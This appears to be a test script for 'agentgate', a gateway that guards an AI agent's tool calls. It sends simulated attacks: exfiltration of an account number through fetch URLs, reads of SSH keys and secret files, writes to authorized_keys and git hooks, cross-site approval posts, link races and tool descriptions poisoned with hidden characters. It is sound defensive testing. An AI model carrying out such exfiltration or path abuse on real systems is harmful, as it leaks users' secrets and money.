"""Model-free checks of agentgate's rules. Run: python test_gateway.py"""
import html
import io
import json
import os
import shutil
import subprocess
import sys
import tempfile
import threading
import time
import urllib.error
import urllib.parse
import urllib.request

HERE = os.path.dirname(os.path.abspath(__file__))
BENCH = os.path.join(os.path.dirname(HERE), "bench")


def setup():
    tmp = tempfile.mkdtemp(prefix="gwtest-")
    svc = os.path.join(tmp, "svc")
    os.makedirs(os.path.join(svc, "data"))
    shutil.copy(os.path.join(BENCH, "mocktools.py"), os.path.join(svc, "lifeservices.py"))
    shutil.copy(os.path.join(BENCH, "fixtures", "inbox_pay.json"), os.path.join(svc, "data", "inbox.json"))
    shutil.copy(os.path.join(BENCH, "fixtures", "contacts.json"), os.path.join(svc, "data", "contacts.json"))
    shutil.copytree(os.path.join(BENCH, "fixtures", "sandbox"), os.path.join(tmp, "sb"))
    return tmp, svc


class Client:
    def __init__(self, tmp, svc, port=0, policy="policy.assistant.json"):
        cmd = [sys.executable, os.path.join(HERE, "gateway.py"), "--policy", os.path.join(HERE, policy),
               "--server", "lifeservices", "--root", os.path.join(tmp, "sb", "work"), "--builtins",
               "--log", os.path.join(tmp, "gateway.jsonl")]
        if port:
            cmd += ["--approve-port", str(port), "--approve-wait", "10", "--no-open"]
        cmd += ["--", sys.executable, os.path.join(svc, "lifeservices.py")]
        self.p = subprocess.Popen(cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
        self.i = 0
        self.call("initialize", {"protocolVersion": "2025-06-18"})

    def call(self, method, params):
        self.i += 1
        self.p.stdin.write((json.dumps({"jsonrpc": "2.0", "id": self.i, "method": method, "params": params}) + "\n").encode())
        self.p.stdin.flush()
        return json.loads(self.p.stdout.readline().decode("utf-8"))

    def tool(self, name, **args):
        r = self.call("tools/call", {"name": name, "arguments": args})["result"]
        return bool(r.get("isError")), r["content"][0]["text"]

    def close(self):
        self.p.stdin.close()
        self.p.wait(5)


def upstream_calls(svc):
    p = os.path.join(svc, "var", "tools.jsonl")
    return [json.loads(l)["tool"] for l in io.open(p, encoding="utf-8")] if os.path.exists(p) else []


fails = 0


def check(label, cond):
    global fails
    print(("PASS  " if cond else "FAIL  ") + label)
    fails += 0 if cond else 1


tmp, svc = setup()
c = Client(tmp, svc)
names = [t["name"] for t in c.call("tools/list", {})["result"]["tools"]]
check("lists mail/pay/builtins", {"mail_read", "pay_merchant", "gw_read_file", "gw_fetch"} <= set(names))
err, text = c.tool("pay_merchant", merchant="Sunny Cafe", amount_twd=1200)
check("money blocked without approver", err and "BLOCKED_BY_AGENTGATE" in text)
check("pay never reached upstream", "pay_merchant" not in upstream_calls(svc))
err, _ = c.tool("contacts_list")
check("contacts allowed before taint", not err)
err, _ = c.tool("mail_read", id="m4")
check("mail read allowed", not err)
err, text = c.tool("contacts_list")
check("contacts blocked after taint (pii)", err)
err, text = c.tool("gw_read_file", path="2026-09.csv")
check("workspace read allowed", not err and "412" in text)
err, text = c.tool("gw_read_file", path="../home/.secrets/bank.txt")
check("secret path denied", err and "敏感路徑" in text)
err, text = c.tool("gw_read_file", path="../home/Documents/notes.txt")
check("outside workspace needs confirmation", err and "工作區以外" in text)
err, text = c.tool("gw_write_file", path="memo.md", content="x")
check("write after taint needs confirmation", err)
c.close()

# leak check: a token read from a file may not leave in a URL
tmp2, svc2 = setup()
with io.open(os.path.join(tmp2, "sb", "work", "acct.txt"), "w", encoding="utf-8") as f:
    f.write("acct 8072-1934-5528-06\n")
c = Client(tmp2, svc2)
c.tool("gw_read_file", path="acct.txt")
err, text = c.tool("gw_fetch", url="http://93.184.216.34/x?d=8072-1934-5528-06")
check("file content in URL denied", err and "夾帶" in text)
c.close()

# --- regressions from the 2026-10-03 security review
tmp4, svc4 = setup()
os.makedirs(os.path.join(tmp4, "sb", "home", ".ssh"))
with io.open(os.path.join(tmp4, "sb", "home", ".ssh", "id_test"), "w") as f:
    f.write("SYNTHETIC KEY\n")
c = Client(tmp4, svc4)
err, text = c.tool("gw_fetch", url="file:///" + os.path.join(tmp4, "sb", "home", ".ssh", "id_test").replace("\\", "/"))
check("R1 file:// fetch denied", err and "SYNTHETIC" not in text)
err, text = c.tool("gw_fetch", url="http://127.0.0.1:9/")
check("R10 loopback fetch denied by default", err and "內網" in text)
err, text = c.tool("gw_write_file", path="run.bat", content="echo hi")
check("R8 executable write denied", err and "執行" in text)
err, text = c.tool("gw_write_file", path=".git/hooks/pre-commit", content="x")
check("R8 git hook write denied", err)
err, text = c.tool("gw_write_file", path="evil.bat::$DATA", content="x")
check("RB alternate data stream write denied", err and not os.path.exists(os.path.join(tmp4, "sb", "work", "evil.bat")))
err, text = c.tool("gw_write_file", path="conftest.py", content="x")
check("RB non-document extension denied", err)
err, text = c.tool("gw_write_file", path="notes.md", content="ok")
check("RB plain document write allowed before taint", not err)
for unc in ("//203.0.113.9/share/x.txt", "/\\203.0.113.9\\share\\x.txt", "\\\\?\\C:\\x.txt"):
    t0 = time.time()
    err, text = c.tool("gw_read_file", path=unc)
    check("R3b UNC/device path denied before resolving: " + unc, err and "網路路徑" in text and time.time() - t0 < 1)
c.tool("gw_read_file", path="2026-09.csv")  # taints the session
err, text = c.tool("gw_write_file", path="../home/.ssh/authorized_keys", content="k" * 400)
check("R4 tainted write to sensitive path is deny, not confirm", err and "敏感路徑" in text)
c.p.stdin.write(b"[1,2]\n")
c.p.stdin.flush()
c.p.stdout.readline()
check("R9 non-object JSON does not kill the gateway", "gw_read_file" in json.dumps(c.call("tools/list", {})))
err, text = c.tool("no_such_tool")
check("unknown tool name denied", err)
c.close()

tmp5, svc5 = setup()
with io.open(os.path.join(tmp5, "sb", "work", "acct.txt"), "w", encoding="utf-8") as f:
    f.write("acct 8072-1934-5528-06\n")
c = Client(tmp5, svc5)
c.tool("gw_read_file", path="acct.txt")
err, text = c.tool("gw_fetch", url="http://93.184.216.34/8072/1934/5528/06")
check("R3 token split into path segments denied", err and "夾帶" in text)
# an encoded copy dodges the token match, so the private-read rule must catch it
import base64 as _b64
enc = _b64.urlsafe_b64encode(b"8072-1934-5528-06").decode().rstrip("=")
err, text = c.tool("gw_fetch", url="http://93.184.216.34/x?d=" + enc)
check("R3 base64-encoded secret in URL needs approval after a private read", err and "白名單" in text)
c.tool("mail_read", id="m1")
err, text = c.tool("gw_fetch", url="http://93.184.216.34/news")
check("R3 any non-allowlisted fetch after taint needs approval", err and "白名單" in text)
c.close()

# round 3: a visited host is no exemption once private data was read
import http.server
class _H(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200); self.end_headers(); self.wfile.write(b"<p>page</p>")
    def log_message(self, *a): pass
srv = http.server.ThreadingHTTPServer(("127.0.0.1", 8765), _H)
threading.Thread(target=srv.serve_forever, daemon=True).start()
tmp6, svc6 = setup()
c = Client(tmp6, svc6, policy="policy.bench.json")
err, _ = c.tool("gw_fetch", url="http://127.0.0.1:8765/a")
check("R5 page fetch allowed", not err)
err, _ = c.tool("gw_fetch", url="http://127.0.0.1:8765/b")
check("R5 same-site link allowed while only pages were read", not err)
c.tool("gw_read_file", path="2026-09.csv")
err, text = c.tool("gw_fetch", url="http://127.0.0.1:8765/c?d=MjAyNi0wOQ")
check("R5 visited host needs approval after a private read", err and "白名單" in text)
c.close()
srv.shutdown()

# out-of-band approval: CSRF token, local origin only, every argument shown, single use
tmp3, svc3 = setup()
c = Client(tmp3, svc3, port=8799)
result = {}


def pay():
    result["r"] = c.tool("pay_merchant", merchant="Sunny Cafe", amount_twd=1200, account="OTHER-ACCT")


def post(form, headers=None):
    req = urllib.request.Request("http://127.0.0.1:8799/d", data=urllib.parse.urlencode(form).encode(), method="POST",
                                 headers=headers or {})
    try:
        return urllib.request.urlopen(req).status
    except urllib.error.HTTPError as e:
        return e.code


th = threading.Thread(target=pay)
th.start()
time.sleep(1.5)
page = urllib.request.urlopen("http://127.0.0.1:8799/").read().decode("utf-8")
check("approval page shows payee and amount from args", "Sunny Cafe" in page and "1200" in page)
check("R7 approval page shows extra arguments", "OTHER-ACCT" in page)
pid = page.split("name=id value='")[1].split("'")[0]
csrf = page.split("name=csrf value='")[1].split("'")[0]
check("R2 POST without CSRF token rejected", post({"id": pid, "d": "approve"}) == 403)
check("R2 cross-site POST rejected", post({"id": pid, "d": "approve", "csrf": csrf},
                                         {"Origin": "http://evil.example"}) == 403)
check("R2 rebinding Host rejected", post({"id": pid, "d": "approve", "csrf": csrf},
                                         {"Host": "rebind.evil.example"}) == 403)
check("still pending after rejected posts", upstream_calls(svc3).count("pay_merchant") == 0)
post({"id": pid, "d": "approve", "csrf": csrf})
th.join(10)
check("approved call goes through", result.get("r") and not result["r"][0])
check("upstream saw exactly one payment", upstream_calls(svc3).count("pay_merchant") == 1)
check("approval was single use", post({"id": pid, "d": "approve", "csrf": csrf}) in (200, 303)
      and upstream_calls(svc3).count("pay_merchant") == 1)
c.close()

# --- 0.3.2: tamper-evident audit log (hash chain, argument fingerprint, verify-log)
import hashlib  # noqa: E402


def read_log(path):
    return [json.loads(l) for l in io.open(path, encoding="utf-8") if l.strip()]


def verify(path):
    r = subprocess.run([sys.executable, os.path.join(HERE, "gateway.py"), "verify-log", path],
                       capture_output=True, text=True, timeout=30)
    return r.returncode, r.stdout + r.stderr


paid = [e for e in read_log(os.path.join(tmp3, "gateway.jsonl")) if e["tool"] == "pay_merchant" and e["approved"]]
want = hashlib.sha256(json.dumps(["pay_merchant", {"merchant": "Sunny Cafe", "amount_twd": 1200, "account": "OTHER-ACCT"}],
                                 sort_keys=True, ensure_ascii=False).encode("utf-8")).hexdigest()
check("log: args_sha256 of an approved call is the digest the approval page showed",
      len(paid) == 1 and paid[0]["args_sha256"] == want and want[:12] in page)

log1 = os.path.join(tmp, "gateway.jsonl")
entries = read_log(log1)
check("log: every entry keeps the bench fields and adds seq, args_sha256, prev, hash",
      len(entries) >= 8 and all({"tool", "verdict", "reason", "class", "approved", "ts", "tainted"} <= set(e)
                                and len(e["args_sha256"]) == 64 and len(e["prev"]) == 64 and len(e["hash"]) == 64
                                for e in entries)
      and [e["seq"] for e in entries] == list(range(1, len(entries) + 1)) and entries[0]["prev"] == "0" * 64)
text1 = io.open(log1, encoding="utf-8").read()
check("log: raw argument values are not written", not any(s in text1 for s in ("Sunny Cafe", "2026-09.csv", "bank.txt",
                                                                                "notes.txt", "memo.md")))
rc, out = verify(log1)
check("log: verify-log passes after several calls", rc == 0 and ("OK: %d entries" % len(entries)) in out)
c = Client(tmp, svc)  # a restarted gateway appends to the same file
c.tool("contacts_list")
c.close()
entries2 = read_log(log1)
check("log: a restarted gateway continues the chain (seq 1, prev = last hash)",
      len(entries2) == len(entries) + 1 and entries2[-1]["seq"] == 1 and entries2[-1]["prev"] == entries[-1]["hash"]
      and verify(log1)[0] == 0)

lines = io.open(log1, encoding="utf-8").read().splitlines(True)
bad = os.path.join(tmp, "edited.jsonl")
e = json.loads(lines[2])
e["verdict"] = "allow" if e["verdict"] != "allow" else "deny"
with io.open(bad, "w", encoding="utf-8", newline="\n") as f:
    f.writelines(lines[:2] + [json.dumps(e, ensure_ascii=False) + "\n"] + lines[3:])
rc, out = verify(bad)
check("log: editing one entry makes verify-log fail at that line", rc == 1 and "BROKEN at line 3" in out)
with io.open(bad, "w", encoding="utf-8", newline="\n") as f:
    f.writelines(lines[:3] + lines[4:])
rc, out = verify(bad)
check("log: removing a line makes verify-log fail at the next one", rc == 1 and "BROKEN at line 4" in out)

with io.open(log1, "a", encoding="utf-8", newline="\n") as f:
    f.write('{"tool": "cut sho')  # a crash mid-write: no newline
c = Client(tmp, svc)
c.tool("contacts_list")
c.close()
lines = io.open(log1, encoding="utf-8").read().splitlines()
last = json.loads(lines[-1])
check("log: after a cut-short line the next entry starts its own line and a new chain",
      lines[-2] == '{"tool": "cut sho' and last.get("chain_restart") is True and last["prev"] == "0" * 64)
rc, out = verify(log1)
check("log: verify-log reports the cut-short line", rc == 1 and "BROKEN at line %d" % (len(lines) - 1) in out)
with io.open(log1, "w", encoding="utf-8", newline="\n") as f:
    f.write("\n".join(lines[:-2] + lines[-1:]) + "\n")
rc, out = verify(log1)
check("log: with that line removed, verify-log passes and names the restart", rc == 0 and "restarts at line" in out)

# --- 0.3.2 review fixes: hard links, check-to-use races, what the approval page shows
import types  # noqa: E402

tmp7, svc7 = setup()
work7 = os.path.join(tmp7, "sb", "work")
outside7 = os.path.join(tmp7, "outside")
os.makedirs(outside7)
victim = os.path.join(outside7, "victim.txt")
with io.open(victim, "w", encoding="utf-8") as f:
    f.write("OUTSIDE ORIGINAL\n")


def victim_intact():
    return io.open(victim, encoding="utf-8").read() == "OUTSIDE ORIGINAL\n"


os.link(victim, os.path.join(work7, "linked.txt"))  # NTFS and POSIX: realpath() cannot see it
c = Client(tmp7, svc7, port=8799)
err, text = c.tool("gw_read_file", path="linked.txt")
check("hard link: reading a workspace name of an outside file is denied", err and "硬連結" in text and "OUTSIDE" not in text)
err, text = c.tool("gw_write_file", path="linked.txt", content="replaced")
check("hard link: writing it is denied and the outside file keeps its content",
      err and "硬連結" in text and victim_intact()
      and [e["verdict"] for e in read_log(os.path.join(tmp7, "gateway.jsonl"))[-2:]] == ["deny", "deny"])
c.tool("gw_read_file", path="2026-09.csv")  # taints the session: writes now wait for approval


def held(name, **args):
    """Start a call that waits on the approval page; -> (thread, result holder, page html)."""
    res = {}
    th = threading.Thread(target=lambda: res.setdefault("r", c.tool(name, **args)))
    th.start()
    pg_html = ""
    for _ in range(40):
        time.sleep(0.25)
        pg_html = urllib.request.urlopen("http://127.0.0.1:8799/").read().decode("utf-8")
        if "name=id value='" in pg_html:
            break
    return th, res, pg_html


def approve(pg_html):
    post({"id": pg_html.split("name=id value='")[1].split("'")[0], "d": "approve",
          "csrf": pg_html.split("name=csrf value='")[1].split("'")[0]})


body = "left" + " " * 300 + "right" + "x" * 2000
th, res, pg_html = held("gw_write_file", path="memo2.md", content=body)
check("page: <pre> wraps, a run of spaces is counted, and cut content shows the full text's sha256",
      "white-space:pre-wrap" in pg_html and "␠×300" in pg_html
      and hashlib.sha256(body.encode("utf-8")).hexdigest() in pg_html)
os.link(victim, os.path.join(work7, "memo2.md"))  # appears while the call waits
approve(pg_html)
th.join(15)
check("race: a hard link placed at the path during the wait is refused at execution time",
      res.get("r") and res["r"][0] and "硬連結" in res["r"][1] and victim_intact())

os.makedirs(os.path.join(work7, "sub"))
judged7 = os.path.realpath(os.path.join(work7, "sub", "memo3.md"))
th, res, pg_html = held("gw_write_file", path="sub/memo3.md", content="synthetic")
check("page: shows the resolved path that was judged", html.escape(json.dumps(judged7, ensure_ascii=False)) in pg_html)
os.rename(os.path.join(work7, "sub"), os.path.join(work7, "sub_old"))
try:  # a directory link swapped in during the wait (POSIX symlink; Windows junction needs no privilege)
    os.symlink(outside7, os.path.join(work7, "sub"), target_is_directory=True)
except OSError:
    subprocess.run(["cmd", "/c", "mklink", "/J", os.path.join(work7, "sub"), outside7], capture_output=True)
approve(pg_html)
th.join(15)
check("race: a path that resolves elsewhere after the approval is refused, nothing written there",
      os.path.realpath(os.path.join(work7, "sub")) == os.path.realpath(outside7)
      and res.get("r") and res["r"][0] and "改動" in res["r"][1] and not os.path.exists(os.path.join(outside7, "memo3.md")))
c.close()

import gateway as gwmod  # noqa: E402
s = gwmod.Gate.summary(types.SimpleNamespace(decided_path=None), 'mail_list\n"path" = "x.txt"',
                       {"q": "a" + " " * 50 + "b"}, {"class": None})
check("page: a tool name cannot draw a fake argument line (summary head escaped)",
      s.count("\n") == 1 and s.startswith('mail_list\\u000a"path" = "x.txt"') and "␠×50" in s)

# --- 0.3.2: upstream tool metadata reaches the agent without hidden characters
import unicodedata  # noqa: E402


def hidden_chars(v):
    """Every invisible / format / control character (newline and tab aside) in a JSON value, keys included."""
    if isinstance(v, str):
        return [c for c in v if (unicodedata.category(c) in ("Cf", "Cs") or (unicodedata.category(c) == "Cc"
                and c not in "\n\t") or 0xE0000 <= ord(c) <= 0xE01EF or 0xFE00 <= ord(c) <= 0xFE0D)]
    if isinstance(v, list):
        return [c for x in v for c in hidden_chars(x)]
    if isinstance(v, dict):
        return [c for k, x in v.items() for c in hidden_chars(k) + hidden_chars(x)]
    return []


# --- packaging and the demo (0.3.0)
import demo  # noqa: E402  (this folder is on sys.path when run as a script)

a = demo.Agent([sys.executable, os.path.join(HERE, "gateway.py"), "--policy", "assistant", "--server", "lifeservices",
                "--", sys.executable, os.path.join(HERE, "demo_server.py")])
names = [t["name"] for t in a.call("tools/list", {}).get("tools", [])]
blocked, _ = a.tool("pay_merchant", {"merchant": "Sunny Cafe", "amount_twd": 1200})
a.close()
check("built-in policy name 'assistant' resolves", "pay_merchant" in names)
check("built-in policy still gates money with no approver", blocked)
r = subprocess.run([sys.executable, os.path.join(HERE, "gateway.py"), "--policy", "nosuch", "--server", "x",
                    "--", sys.executable, "-c", "pass"], capture_output=True, text=True, timeout=30)
check("unknown policy name fails with the built-in list", r.returncode != 0 and "assistant" in r.stderr)

env = dict(os.environ, PYTHONIOENCODING="utf-8")
r = subprocess.run([sys.executable, os.path.join(HERE, "gateway.py"), "demo", "--no-approver"],
                   capture_output=True, timeout=60, env=env)
out = r.stdout.decode("utf-8", "replace")
check("demo --no-approver: inbox read allowed, payment blocked",
      r.returncode == 0 and "allowed:" in out and "BLOCKED" in out and "DEMO-" not in out)

d = subprocess.Popen([sys.executable, os.path.join(HERE, "gateway.py"), "demo", "--port", "8797", "--no-browser",
                      "--wait", "20"], stdout=subprocess.PIPE, env=env)
page, out = "", ""
try:
    for _ in range(60):
        time.sleep(0.25)
        try:
            page = urllib.request.urlopen("http://127.0.0.1:8797/", timeout=5).read().decode("utf-8")
        except Exception:
            continue
        if "pay_merchant" in page:
            break
    if "name=id value='" in page:
        pid = page.split("name=id value='")[1].split("'")[0]
        csrf = page.split("name=csrf value='")[1].split("'")[0]
        urllib.request.urlopen(urllib.request.Request("http://127.0.0.1:8797/d", method="POST",
                               data=urllib.parse.urlencode({"id": pid, "d": "approve", "csrf": csrf}).encode()),
                               timeout=5)
    out = d.communicate(timeout=30)[0].decode("utf-8", "replace")
finally:
    if d.poll() is None:
        d.kill()
check("demo confirmation page shows the payment's real arguments", "Sunny Cafe" in page and "1200" in page)
check("confirmation page is bilingual", "Approve once" in page and "批准這一次" in page)
check("demo: approving on the page lets exactly that payment through", "APPROVED" in out and "DEMO-" in out)

# --- 0.3.1: the user hears about a held call; one listener per approval port; English messages
gcmd = [sys.executable, os.path.join(HERE, "gateway.py"), "--policy", "assistant", "--server", "lifeservices",
        "--approve-port", "8795", "--approve-wait", "2", "--no-open", "--", sys.executable, os.path.join(HERE, "demo_server.py")]
g = demo.Agent.__new__(demo.Agent)
g.p = subprocess.Popen(gcmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
g.i = 0
g.call("initialize", {"protocolVersion": "2025-06-18"})
second = subprocess.run(gcmd, stdin=subprocess.DEVNULL, capture_output=True, encoding="utf-8", errors="replace",
                        timeout=30)
check("a second agentgate on the same approval port exits with a clear message",
      second.returncode != 0 and "--approve-port" in second.stderr)
blocked, text = g.tool("pay_merchant", {"merchant": "Sunny Cafe", "amount_twd": 1200})
check("blocked message keeps its prefix and is in English too",
      blocked and text.startswith("BLOCKED_BY_AGENTGATE: the boundary gateway blocked pay_merchant") and "邊界閘道" in text)
g.close()
err = g.p.stderr.read().decode("utf-8", "replace")
check("a held call tells the user where to approve it (stderr)", "waiting for your approval: http://127.0.0.1:8795/" in err)

# (0.3.2 metadata sanitising, continued) a throwaway upstream whose tool list carries invisible text
pg = demo.Agent.__new__(demo.Agent)
pg.p = subprocess.Popen([sys.executable, os.path.join(HERE, "gateway.py"), "--policy", "assistant", "--server", "poison",
                         "--", sys.executable, os.path.join(HERE, "test_upstream_poison.py")],
                        stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
pg.i = 0
pg.call("initialize", {"protocolVersion": "2025-06-18"})
listed = pg.call("tools/list", {})["tools"]
called = pg.tool("mail\u200bread", {})
pg.close()
perr = pg.p.stderr.read().decode("utf-8", "replace")
by = {t["name"]: t for t in listed}
check("poison: no hidden character reaches tools/list (descriptions, titles, schema strings, keys)",
      hidden_chars(listed) == [])
check("poison: a tool whose name has a hidden character is not listed, and calling it is 'no such tool'",
      set(by) == {"mail_list", "mail_clean", "mail_long"} and called[0] and "no such tool" in called[1])
check("poison: the dropped tool is named on stderr, escaped", "mail\\u200bread" in perr and "not listed" in perr)
check("poison: names outside [A-Za-z0-9_.-]{1,128} (a line break, a space) are not listed either",
      perr.count("not listed") == 3 and "mail list" in perr and "\\n" in perr and not any(n.startswith("mail_list\n") for n in by))
ml = by.get("mail_list", {})
check("poison: visible text kept and the description marked as tampered",
      ml.get("description", "").startswith("Lists the inbox.x [agentgate: hidden characters removed]")
      and ml.get("title") == "Inbox" and ml.get("annotations") == {"title": "Inbox"})
props = ml.get("inputSchema", {}).get("properties", {})
check("poison: schema strings cleaned (title, description, enum, default, nested items, property name, "
      "a VS16 after an ASCII letter)",
      props.get("folder") == {"type": "string", "title": "Folder", "description": "Folder name.",
                              "enum": ["inbox", "archive"], "default": "inbox"}
      and props.get("limit") == {"type": "array", "items": {"type": "string", "description": "One"}})
mc = by.get("mail_clean", {}).get("description", "")
check("poison: clean text keeps newline, tab and an emoji's variation selector, and gets no marker",
      mc.startswith("Lists the inbox.\nSecond line.\tTabbed.\nThird ⚠\ufe0f.") and "hidden characters" not in mc)
mlong = by.get("mail_long", {}).get("description", "")
check("poison: an over-long description is capped at 2000 characters",
      mlong.startswith(("Lists the inbox. " * 300)[:2000] + " …[truncated by agentgate]")
      and "hidden characters" not in mlong)

print("\n%d failure(s)" % fails)
sys.exit(1 if fails else 0)
